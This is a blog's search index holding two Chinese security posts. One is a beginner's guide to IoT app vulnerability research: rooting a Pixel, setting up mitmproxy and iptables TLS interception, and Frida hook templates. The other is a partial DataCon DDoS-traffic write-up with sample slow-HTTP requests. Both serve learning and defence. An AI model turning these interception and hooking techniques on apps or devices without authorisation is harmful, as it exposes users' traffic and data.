<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次零基础IOT设备与app交互0day漏洞挖掘学习经历</title>
    <link href="/2023/12/12/2023apkreverse/"/>
    <url>/2023/12/12/2023apkreverse/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="apk结构"><a href="#apk结构" class="headerlink" title="apk结构"></a>apk结构</h3><p>apk是对一个安卓应用程序所需要的文件进行打包，本质上是一个被签名的压缩包。</p><p>通常情况下，apk会含有以下文件：</p><ul><li>asset文件夹：是不需编译的原始资源目录，包含各种静态的资源，如各种配置文件、JavaScript、字体文件、图片文件等。</li><li>lib文件夹：动态链接库存放的位置，通常情况下，这个文件夹内部以不同处理器版本还会划分成多个文件夹，如armeabi、armeabi-v7a、x86等，其存放的文件通常为Android Native的代码。</li><li>META-INF文件夹：用来存放签名信息，通常会有CERT.RSA、CERT.SF和MANIFEST.MF三个文件。是用来保护apk的所有权和防止apk被恶意篡改。</li><li>r文件夹&#x2F;res文件夹：存放编译资源文件，与asset文件夹相似，区别是其存放的文件是编译后的。通常会包含drawable 文件夹（图片资源文件）、layout 文件夹（布局文件）和values 文件夹（值资源文件）等。r文件夹通常是res文件夹进行混淆后的结果。</li><li>AndroidManifest.xml文件：apk的整体配置文件，其中包含了一个apk的各种配置信息，包括包名、应用名、权限、安卓四大组件、版本等重要信息。</li><li>dex文件：存放字节码的文件，其反汇编后为smali语言，可转化为Java代码，通常dex文件包含一个apk的主要逻辑。</li><li>resources.arsc文件：用来存放应用程序的资源表，包含了应用程序的资源 ID 和资源类型的映射关系。</li></ul><h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><p>jadx&#x2F;jeb：均为Android程序Java层反编译软件，相对来说jeb反编译能力相对较强，可以看到smali层的代码，而且也有一些混淆对抗的能力</p><p>frida：Android程序二进制动态插桩工具，用来动态调试Android程序</p><p>xposed：动态调试插件，相对于frida更加稳定</p><p>mitmproxy：中间人工具，用来监控并解密app端TLS流量</p><p>wireshark：对网卡进行抓包，配合mitmproxy使用可以获取tls解密后的流量信息</p><p>ida：用来反编译Android native层代码</p><p>iptables：配合mitmproxy透明模式，避免app端流量不经过代理导致tls流量无法被解密</p><p>手机：已ROOT</p><p>adb：用来连接手机的shell</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="获取手机Root权限"><a href="#获取手机Root权限" class="headerlink" title="获取手机Root权限"></a>获取手机Root权限</h3><p>本次使用的手机是一台Pixel 6，首先需要在电脑上安装adb，过程省略</p><p>进入手机开发者模式，打开USB调试开关，连接电脑adb，可以使用<code>adb devices</code>查看是否连接成功，连接成功后开始解BL，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb reboot bootloader<br></code></pre></td></tr></table></figure><p>将手机进入Bootloader界面，此时手机处于fastboot模式下，输入<code>fastboot devices</code>查看是否可以正常连接。输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot flashing unlock<br></code></pre></td></tr></table></figure><p>成功解锁BL。</p><blockquote><p>注：Pixel手机如果发现进入fastboot模式adb断开的情况，请检查是否是数据线的原因，可以换个数据线试试，这个坑卡了我好久-_-</p></blockquote><p>解锁BL后，一般都会向手机中安装Magisk，它是用来管理Root权限的工具。来源：<a href="https://github.com/topjohnwu/Magisk">topjohnwu&#x2F;Magisk: The Magic Mask for Android (github.com)</a></p><p>下载好安装包后，可以使用adb install命令来安装Magisk，装好Magisk后，接下来进行镜像修补。</p><p>在<a href="https://developers.google.com/android/images?hl=zh-cn">Nexus 和 Pixel 设备的出厂映像  | Google Play services  | Google for Developers</a>中下载手机对应的镜像文件，在手机设置 - 关于手机页面的最底端可以看到当前的版本号，在页面中找到对应的镜像下载，下载后将其中的boot.img用adb传输到手机，最后使用Magisk软件进行镜像修补，最后将修补完的镜像文件adb pull出来。</p><p>接下来进入最后的刷机步骤，使用<code>adb reboot bootloader</code>再次进入fastboot模式中，使用<code>fastboot boot img地址</code>指令将手机从修补过的img启动，重启后进入Magisk按照步骤安装好即可。</p><h3 id="mitmproxy-iptables搭建中间人代理"><a href="#mitmproxy-iptables搭建中间人代理" class="headerlink" title="mitmproxy+iptables搭建中间人代理"></a>mitmproxy+iptables搭建中间人代理</h3><p>mitmproxy是一个强大的中间人代理工具，与其他中间人代理工具相比，mitmproxy不仅可以转发http&#x2F;https流量，还可以转发非http流量，如MQTT等。</p><p>在Android设备中抓取https流量，我们需要安装mitmproxy的CA证书，<a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">由于Android 7开始，应用会默认忽略用户级别的证书</a>，因此，我们需要将CA证书放入系统级别中。</p><p>一般情况下，将证书格式先转化为pem格式，然后通过<code>openssl x509 -subject_hash_old -in certificate.pem|head -1</code>命令读取哈希值，将pem证书名字改为刚刚提取的哈希值加.0，如<code>9a5ba575.0</code>，其中.0是为了防止证书哈希值重复，如果两个证书哈希值重复，那么后面的证书就会被重命名为.1、.2等，最后将<code>/system/etc/security/cacerts/</code>目录可写权限打开，将重命名后的证书放进去即可。</p><p>我的手机版本为Android 10以上，无法直接通过更改文件夹写入权限来导入证书（也可能是我没有搞好），我使用了Magisk的<code>Always Trust User Certificates</code>模块，直接将证书装在用户目录下，重启后即可导入到系统证书中。</p><p>装好证书后，正常情况下手机端连wifi时配置代理后应该是可以解密https流量了，但是，如果app拒绝代理或想要捕获其他tcp流量时，就需要使用mitmproxy透明模式，透明模式的启动命令为<code>mitmproxy --mode transparent --showhost</code>，开启透明模式后，工作原理如下图：</p><img src="/2023/12/12/2023apkreverse/transparent.png" class=""><p>此时，对于手机来说，mitmproxy相当于一个服务器，对于原服务器来说，mitmproxy相当于设备。</p><p>由于透明模式需要对网络层进行转发，因此还需要配置iptables，关于iptables的知识可以看这篇博客<a href="https://www.zsythink.net/archives/tag/iptables/">iptables-朱双印博客 (zsythink.net)</a>，在此贴一张iptables的原理图。</p><img src="/2023/12/12/2023apkreverse/iptables.png" class=""><p>我的iptables规则参考了fwx学长的博客<a href="https://fwx2233.github.io/2023/02/17/%E5%9F%BA%E4%BA%8Emitmproxy+iptables+SSL-pinning%E7%BB%95%E8%BF%87+wireshark%E7%9A%84%E5%AE%89%E5%8D%93APP%E6%B5%81%E9%87%8F-%E5%8C%85%E6%8B%ACHTTP-HTTPS%E5%92%8C%E9%9D%9EHTTP-%E6%8D%95%E8%8E%B7/">基于mitmproxy+iptables+SSL pinning绕过技术+wireshark的安卓APP流量（包括HTTP、HTTPS和非HTTP）捕获 | 代码鬼才的Blog (fwx2233.github.io)</a>，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># 写监听的无线网卡的名称</span><br>WIRELESS_CARD=<span class="hljs-string">&quot;wlxc01c30151c62&quot;</span><br><br><span class="hljs-comment"># 开启相关的转发服务</span><br>sudo sysctl -w net.ipv4.ip_forward=1<br>sudo sysctl -w net.ipv4.conf.all.send_redirects=0<br><br><span class="hljs-comment"># 设置iptables的规则</span><br><span class="hljs-comment"># 将之前的规则清空</span><br>sudo iptables -F PREROUTING -t nat -i <span class="hljs-variable">$WIRELESS_CARD</span><br><span class="hljs-comment"># 设置端口转发(MQTT: 8883, HTTP: 80, HTTS: 443)</span><br>sudo iptables -t nat -A PREROUTING -i <span class="hljs-variable">$WIRELESS_CARD</span> -p tcp --dport 80 -j REDIRECT --to-port 8080<br>sudo iptables -t nat -A PREROUTING -i <span class="hljs-variable">$WIRELESS_CARD</span> -p tcp --dport 443 -j REDIRECT --to-port 8080<br>sudo iptables -t nat -A PREROUTING -i <span class="hljs-variable">$WIRELESS_CARD</span> -p tcp --dport 8883 -j REDIRECT --to-port 8080<br></code></pre></td></tr></table></figure><blockquote><p>最开始我一直想要拿win+mitmproxy透明模式进行抓包，想要通过netsh来代替iptables进行流量转发，然而一直没有成功，如果读者有配置成功的经历麻烦评论区分享一下</p></blockquote><p>接下来配置wireshark，通过捕获mitmproxy密钥交换过程中生成的随机数来进行TLS解密，操作方式也可以直接看官方文档<a href="https://docs.mitmproxy.org/stable/howto-wireshark-tls/">Wireshark and SSL&#x2F;TLS (mitmproxy.org)</a></p><blockquote><p>如果时间过长或多次抓包导致生成的随机数文件过大，可能会导致wireshark解密失败，可以定时清空生成的随机数文件。</p></blockquote><p>至此基本环境配置完毕，给出我的最终网络拓扑图。</p><img src="/2023/12/12/2023apkreverse/diagram.png" class=""><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="frida进行hook"><a href="#frida进行hook" class="headerlink" title="frida进行hook"></a>frida进行hook</h3><p>frida安装过程省略，网上有很多教程可以参考。</p><p>frida中有两种操作模式，分别是CLI模式和RPC模式</p><ul><li>CLI（命令行）模式：通过命令行直接将JavaScript脚本注入进程中，对进程进行操作</li><li>RPC模式：使用Python进行JavaScript脚本的注入工作，实际对进程进行操作的还是JavaScript脚本，可以通过RPC传输给Python脚本来进行复杂数据的处理</li></ul><p>frida有两种注入模式，分别是Spawn和Attach</p><ul><li>Spawn模式：将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App。在命令行模式中需要加入参数<code>-f</code>，可以对从启动就开始对App进行监控。</li><li>Attach模式：在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作。如果只关心一个功能时通常会用这种模式。</li></ul><p>相关的api可以在官网上查看官方文档<a href="https://frida.re/docs/home/">Welcome | Frida • A world-class dynamic instrumentation toolkit</a></p><p>给出一个python的框架代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys,frida<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">这里输入你的js代码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message,data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;send&quot;</span>:<br>        <span class="hljs-built_in">print</span>(message[<span class="hljs-string">&quot;payload&quot;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><span class="hljs-comment"># process = frida.get_usb_device().spawn(&quot;app&quot;))</span><br>process = frida.get_usb_device().attach(<span class="hljs-string">&quot;app&quot;</span>)<br>script = process.create_script(jscode)<br>script.on(<span class="hljs-string">&quot;message&quot;</span>,on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><h4 id="Java层hook"><a href="#Java层hook" class="headerlink" title="Java层hook"></a>Java层hook</h4><p>Java层hook示例代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">setImmediate</span>(<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> targetClass = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(className); <span class="hljs-comment">// 替换为您的类名</span><br>        targetClass.<span class="hljs-property">examplefunction</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b,c...</span>)&#123;<span class="hljs-comment">//替换为参数</span><br>            <span class="hljs-comment">//调用原始方法</span><br>            <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">examplefunction</span>(a, b, c...);<br>            <span class="hljs-comment">//可以在这里进行各种操作</span><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>&#125;);<br>);<br></code></pre></td></tr></table></figure><p>hook重载参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(className);<br>    <span class="hljs-comment">//overload定义重载函数，根据函数的参数类型填</span><br>    utils.<span class="hljs-property">expfunc</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;com.example.Demo$Class&#x27;</span>,<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a，b</span>)&#123;<br>        b = <span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">expfunc</span>(a,b);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>hook字段修改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//静态字段修改</span><br>    <span class="hljs-keyword">var</span> utils = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(className);<br>    <span class="hljs-comment">//修改类的静态字段&quot;flag&quot;的值</span><br>    utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;我是被修改的静态变量&quot;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(utils.<span class="hljs-property">staticField</span>.<span class="hljs-property">value</span>);<br>    <span class="hljs-comment">//非静态字段的修改</span><br>    <span class="hljs-comment">//使用`Java.choose()`枚举类的所有实例</span><br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.example.Demo&quot;</span>, &#123;<br>        <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>)&#123;<br>            <span class="hljs-comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span><br>            obj.<span class="hljs-property">_privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-string">&quot;123456&quot;</span>; <span class="hljs-comment">//字段名与函数名相同 前面加个下划线</span><br>            obj.<span class="hljs-property">privateInt</span>.<span class="hljs-property">value</span> = <span class="hljs-number">9999</span>;<br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>对内部类进行hook</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//内部类</span><br>    <span class="hljs-keyword">var</span> innerClass = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.Demo$innerClass&quot;</span>);<span class="hljs-comment">//如果是匿名类需要反编译查看具体标号</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerClass);<br>    innerClass.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;hook&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>静态方法主动调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">ClassName</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.Demo&quot;</span>); <br><span class="hljs-title class_">ClassName</span>.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;传参&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>非静态方法主动调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> ret;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.example.Demo&quot;</span>,&#123;    <span class="hljs-comment">//要hook的类</span><br>        <span class="hljs-attr">onMatch</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>)&#123;<br>            ret=instance.<span class="hljs-title function_">privateFunc</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>); <span class="hljs-comment">//要hook的方法</span><br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;result: &quot;</span> + ret);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Native层hook"><a href="#Native层hook" class="headerlink" title="Native层hook"></a>Native层hook</h4><p>枚举so库</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateModules</span>(&#123;<br>        <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) &#123;<br>            <span class="hljs-title function_">send</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; : &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>.<span class="hljs-title function_">toString</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&quot;example.so&quot;</span>) &#123;<br>                <span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;example.so found !&quot;</span>);<br>                <span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;hooking...&quot;</span>);<br>                <span class="hljs-title function_">send</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; : &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&quot; : &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">size</span>.<span class="hljs-title function_">toString</span>() + <span class="hljs-string">&quot; : &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">path</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;end&quot;</span>);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>hook函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> base_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;example.so&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(base_addr.<span class="hljs-title function_">add</span>(<span class="hljs-number">0xabcd</span>), &#123;<span class="hljs-comment">//偏移值</span><br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-comment">//args是参数数组</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args[<span class="hljs-number">0</span>]);<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(retval);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个偏移值的计算，安卓里一般32 位的 so 中都是<code>thumb</code>指令，64 位的 so 中都是<code>arm</code>指令，通过IDA里的opcode bytes来判断，arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入4)</p><ul><li>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1</li><li>arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移</li></ul><h3 id="IDA对so库逆向"><a href="#IDA对so库逆向" class="headerlink" title="IDA对so库逆向"></a>IDA对so库逆向</h3><p>ida的话就是纯看代码环节了，说几个小技巧吧。</p><p>首先就是尽量不要从导出表中反过来找函数，因为有一部分导出表对应的函数是fastcall类型，只观察函数内部有时ida无法将参数识别出来，导致后来再去找函数的调用处时代码都是乱的。</p><p>ida有一键生成frida的插件，<a href="https://github.com/P4nda0s/IDAFrida">P4nda0s&#x2F;IDAFrida: IDA Frida Plugin for tracing something interesting. (github.com)</a>和<a href="https://github.com/AnxiangLemon/MyIdaFrida">AnxiangLemon&#x2F;MyIdaFrida: Generate Frida Script (github.com)</a>，可以直接从ida中生成frida的hook脚本，比较方便（虽然我没用过几次）</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>关于漏洞细节就不发出来了。历时2个多月的零基础从入门到入土，确实学到了不少东西，也踩了一大堆坑，有的坑也卡的比较久，在此感谢w学长给我一步步梳理思路。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wireshark</tag>
      
      <tag>apk逆向</tag>
      
      <tag>frida</tag>
      
      <tag>mitmproxy</tag>
      
      <tag>jeb</tag>
      
      <tag>jadx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 DataCon大数据安全分析竞赛 WriteUp</title>
    <link href="/2023/11/16/2023datacon/"/>
    <url>/2023/11/16/2023datacon/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="互联网威胁溯源"><a href="#互联网威胁溯源" class="headerlink" title="互联网威胁溯源"></a>互联网威胁溯源</h2><h3 id="题目一：形形色色的DDoS"><a href="#题目一：形形色色的DDoS" class="headerlink" title="题目一：形形色色的DDoS"></a>题目一：形形色色的DDoS</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>根据题目描述，攻击者采用了多种DDoS攻击方法，找出这些攻击流量，并将攻击类型相同的源IP进行归类。</p><p>分析题目提供的流量包，wireshark打开。</p><p>观察到多种ddos流量。</p><h5 id="SYN-Flood-Attack"><a href="#SYN-Flood-Attack" class="headerlink" title="SYN Flood Attack"></a>SYN Flood Attack</h5><p>流量特征：仅有一个tcp包。</p><img src="/2023/11/16/2023datacon/syn.png" class=""><h5 id="UDP-Flood-Attack"><a href="#UDP-Flood-Attack" class="headerlink" title="UDP Flood Attack"></a>UDP Flood Attack</h5><p>流量特征：协议为UDP，内容杂乱。</p><img src="/2023/11/16/2023datacon/udp.png" class=""><h5 id="NTP-Reply-Flood-Attack"><a href="#NTP-Reply-Flood-Attack" class="headerlink" title="NTP Reply Flood Attack"></a>NTP Reply Flood Attack</h5><p>流量特征：协议为NTP</p><img src="/2023/11/16/2023datacon/ntp.png" class=""><h5 id="CC-Attack"><a href="#CC-Attack" class="headerlink" title="CC Attack"></a>CC Attack</h5><p>流量特征：具有完整的TCP流量包。</p><p>此次ddos中CC攻击有两种形式：</p><h6 id="第一种（示例）"><a href="#第一种（示例）" class="headerlink" title="第一种（示例）"></a>第一种（示例）</h6><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-1278<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-591<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-452<br><span class="hljs-attribute">X-a</span><span class="hljs-punctuation">: </span>datacon2023-815<br></code></pre></td></tr></table></figure><img src="/2023/11/16/2023datacon/cc1.png" class=""><h6 id="第二种（示例）"><a href="#第二种（示例）" class="headerlink" title="第二种（示例）"></a>第二种（示例）</h6><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1000<br><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">256</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">968</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">236</span></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-a: datacon2023-<span class="hljs-number">808</span></span><br></code></pre></td></tr></table></figure><img src="/2023/11/16/2023datacon/cc2.png" class=""><blockquote><p>更新于2023&#x2F;12&#x2F;10</p><p>wp终于出了，原来这两个分别是<strong>慢速http header泛洪攻击</strong>和<strong>慢速http payload泛洪攻击</strong>，区别是：第一种会定期向目标发送部分请求标头，以使请求保持活动状态；第二种会发送一个值很大的Content-Length字段，之后慢慢发送少量字节的数据包，主机就会认为该请求包存在payload没有发完，因此会维持连接。</p></blockquote><h4 id="解答"><a href="#解答" class="headerlink" 